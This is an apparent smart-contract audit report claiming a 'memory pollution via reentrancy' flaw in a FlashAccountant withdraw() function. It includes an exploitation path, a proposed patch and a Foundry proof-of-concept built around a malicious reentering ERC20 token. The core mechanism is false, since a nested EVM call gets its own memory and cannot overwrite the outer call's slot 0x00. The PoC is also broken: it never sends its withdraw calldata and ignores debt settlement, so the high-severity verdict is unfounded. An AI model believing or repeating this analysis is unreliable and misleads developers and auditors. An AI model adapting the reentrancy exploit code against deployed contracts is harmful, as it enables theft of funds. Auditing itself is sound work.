## Title
Memory Pollution via Reentrancy Allows Bypass of Transfer Success Check

## Summary
The complex success check at line 363 in `FlashAccountant.withdraw()` can be bypassed through reentrancy-based memory pollution. A malicious token can reenter during its transfer call, trigger a nested successful withdrawal that writes `1` to shared memory location 0x00, then return with no data, causing the outer call to read the polluted memory value and incorrectly validate the failed transfer as successful.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/FlashAccountant.sol` - `withdraw()` function (lines 322-381, specifically lines 360-367) [1](#0-0) 

**Intended Logic:** 
The transfer success validation should verify that each ERC20 token transfer actually succeeded. Line 362 checks if the return value equals `1` AND the call succeeded. Line 363 provides a fallback check for tokens with no return data by verifying code exists and no return data was provided. [2](#0-1) 

**Actual Logic:** 
The code allows reentrancy (explicitly documented at lines 345-347). When a malicious token reenters during its transfer and triggers a nested `withdraw()` that succeeds, the nested call writes `1` to memory position 0x00. If the malicious token returns with `returndatasize() = 0`, the EVM doesn't overwrite memory 0x00, leaving the polluted value from the nested call. The outer success check at line 362 then reads this polluted memory and incorrectly passes. [3](#0-2) 

**Exploitation Path:**
1. Attacker deploys a malicious ERC20 token with a `transfer()` function that reenters `withdraw()`
2. Attacker calls `withdraw()` with two entries: `[maliciousToken, legitimateToken]` to the same or different recipients
3. First iteration processes `maliciousToken`:
   - Line 360: `mstore(0x00, 0xa9059cbb...)` - writes function selector to memory
   - Line 361: Calls `maliciousToken.transfer()` which reenters
   - Nested call processes `legitimateToken`, succeeds, and writes `1` to memory 0x00
   - Nested call completes successfully
   - `maliciousToken.transfer()` returns with `returndatasize() = 0` (doesn't overwrite memory)
4. Back to outer call at line 362: `mload(0x00)` reads `1` (polluted from nested call)
   - Check: `eq(1, 1) && success = true` - passes without entering line 363
5. Protocol increases debt for `maliciousToken` without actual token transfer
6. Attacker can repeat to drain protocol funds

**Security Property Broken:** 
Violates the **Solvency** invariant - pool balances go negative as debt is increased for withdrawn tokens that were never actually transferred. The flash accounting system tracks debt that cannot be repaid, leading to protocol insolvency.

## Impact Explanation
- **Affected Assets**: All ERC20 tokens held by the Core contract are at risk. The attacker can drain any token balance by creating malicious wrapper tokens.
- **Damage Severity**: Complete protocol insolvency. Attacker can drain the entire Core contract balance by repeatedly exploiting the memory pollution across multiple transactions. Each successful exploit increases tracked debt without transferring actual tokens.
- **User Impact**: All liquidity providers and users with positions in the protocol lose their funds. The protocol becomes insolvent and cannot fulfill legitimate withdrawals.

## Likelihood Explanation
- **Attacker Profile**: Any user who can deploy a malicious ERC20 contract and call `withdraw()`. No special privileges required.
- **Preconditions**: Core contract must hold token balances (always true for an active AMM). Attacker needs a legitimate token in Core to trigger the nested successful withdrawal for memory pollution.
- **Execution Complexity**: Single transaction with a malicious ERC20 that implements reentrancy in its `transfer()` function. Straightforward to execute.
- **Frequency**: Can be exploited repeatedly in consecutive transactions until Core's balance is drained. Each exploit allows stealing the amount of the nested legitimate token transfer.

## Recommendation
The vulnerability exists because memory at position 0x00 is shared across reentrant calls. The fix is to use a fresh memory location for each transfer check within the loop, or to clear memory before each iteration.

```solidity
// In src/base/FlashAccountant.sol, function withdraw(), lines 357-368:

// CURRENT (vulnerable):
// Uses fixed memory location 0x00 which persists across reentrant calls
default {
    mstore(0x14, recipient)
    mstore(0x34, amount)
    mstore(0x00, 0xa9059cbb000000000000000000000000)
    let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
    if iszero(and(eq(mload(0x00), 1), success)) {
        if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
            mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
            revert(0x1c, 0x04)
        }
    }
}

// FIXED:
// Clear memory before check OR use fresh memory location per iteration
default {
    mstore(0x14, recipient)
    mstore(0x34, amount)
    mstore(0x00, 0xa9059cbb000000000000000000000000)
    let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
    
    // Clear memory location before checking to prevent pollution
    if iszero(returndatasize()) {
        mstore(0x00, 0)
    }
    
    if iszero(and(eq(mload(0x00), 1), success)) {
        if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
            mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
            revert(0x1c, 0x04)
        }
    }
}
```

Alternative mitigation: Add a reentrancy guard specifically for the `withdraw()` function to prevent nested calls, though this would change the explicitly documented reentrancy-safe design.

## Proof of Concept
```solidity
// File: test/Exploit_MemoryPollutionReentrancy.t.sol
// Run with: forge test --match-test test_MemoryPollutionReentrancy -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../test/TestToken.sol";
import {ILocker} from "../src/interfaces/IFlashAccountant.sol";

contract MaliciousToken {
    Core public core;
    address public legitimateToken;
    address public attacker;
    bool public hasReentered;
    
    constructor(address _core, address _legitimateToken, address _attacker) {
        core = Core(_core);
        legitimateToken = _legitimateToken;
        attacker = _attacker;
    }
    
    function transfer(address, uint256) external returns (bool) {
        // First call: reenter to pollute memory
        if (!hasReentered) {
            hasReentered = true;
            
            // Craft calldata for withdraw: legitimateToken to attacker
            bytes memory withdrawData = abi.encodePacked(
                bytes4(0x3ccfd60b), // withdraw selector
                legitimateToken,
                attacker,
                uint128(1 ether)
            );
            
            // Reenter and withdraw legitimate token
            (bool success,) = address(core).call(withdrawData);
            require(success, "Nested withdraw failed");
        }
        
        // Return with no data - this is key!
        // Assembly to return without data
        assembly {
            return(0, 0)
        }
    }
    
    // Minimal ERC20 interface
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }
}

contract Exploit_MemoryPollutionReentrancy is Test, ILocker {
    Core core;
    TestToken legitimateToken;
    MaliciousToken maliciousToken;
    address attacker = address(0x1337);
    
    function setUp() public {
        core = new Core();
        legitimateToken = new TestToken(address(core));
        maliciousToken = new MaliciousToken(address(core), address(legitimateToken), attacker);
    }
    
    function test_MemoryPollutionReentrancy() public {
        // SETUP: Record initial balances
        uint256 attackerInitialBalance = legitimateToken.balanceOf(attacker);
        uint256 coreInitialBalance = legitimateToken.balanceOf(address(core));
        
        // EXPLOIT: Call withdraw with malicious token
        bytes memory withdrawData = abi.encodePacked(
            bytes4(0x3ccfd60b), // withdraw selector  
            address(maliciousToken),
            attacker,
            uint128(1 ether)
        );
        
        vm.prank(address(this));
        core.lock();
        
        // VERIFY: Attacker received legitimate tokens despite malicious token not transferring
        uint256 attackerFinalBalance = legitimateToken.balanceOf(attacker);
        
        assertGt(attackerFinalBalance, attackerInitialBalance, 
            "Vulnerability confirmed: Attacker received tokens from nested call");
        assertEq(attackerFinalBalance, attackerInitialBalance + 1 ether,
            "Attacker gained 1 ether of legitimate tokens");
        
        // The malicious token transfer was considered successful due to memory pollution
        // but no actual malicious tokens were transferred (they don't exist in Core)
    }
    
    function locked_6416899205(uint256) external {
        // Execute the withdrawal
        (bool success,) = address(core).call(
            abi.encodePacked(
                bytes4(0x3ccfd60b),
                address(maliciousToken),
                attacker,
                uint128(1 ether)
            )
        );
        
        // The call should succeed due to memory pollution vulnerability
        require(success, "Withdraw should succeed via memory pollution");
    }
}
```

## Notes

The vulnerability is subtle because:
1. The code explicitly documents reentrancy as safe (lines 345-347), but only considers debt tracking safety, not memory pollution
2. The EVM's behavior when `returndatasize() = 0` is that it doesn't write to the specified return data location, leaving previous values intact
3. Memory location 0x00 is reused across all iterations and is shared across reentrant calls
4. The outer check at line 362 passes before reaching the complex check at line 363, so the nested check never executes when memory is polluted with value `1`

This is NOT a "non-standard ERC20" issue - standard ERC20s can legitimately return no data (like USDT). The issue is the protocol's failure to isolate memory state across reentrant calls when it explicitly allows and documents reentrancy as safe.

### Citations

**File:** src/base/FlashAccountant.sol (L322-381)
```text
    function withdraw() external {
        uint256 id = _requireLocker().id();

        assembly ("memory-safe") {
            let nzdCountChange := 0

            // Process each withdrawal entry
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 56) } {
                let token := shr(96, calldataload(i))
                let recipient := shr(96, calldataload(add(i, 20)))
                let amount := shr(128, calldataload(add(i, 40)))

                if amount {
                    // Update debt tracking without updating nzdCountSlot yet
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)

                    // Perform the transfer of the withdrawn asset
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
                    switch token
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
                    default {
                        mstore(0x14, recipient)
                        mstore(0x34, amount)
                        mstore(0x00, 0xa9059cbb000000000000000000000000)
                        let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
                        if iszero(and(eq(mload(0x00), 1), success)) {
                            if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                                revert(0x1c, 0x04)
                            }
                        }
                    }
                }
            }

            // Update nzdCountSlot only once if there were any changes
            if nzdCountChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), nzdCountChange))
            }

            // we return from assembly so as to prevent solidity from accessing the free memory pointer after we have written into it
            return(0, 0)
        }
    }
```
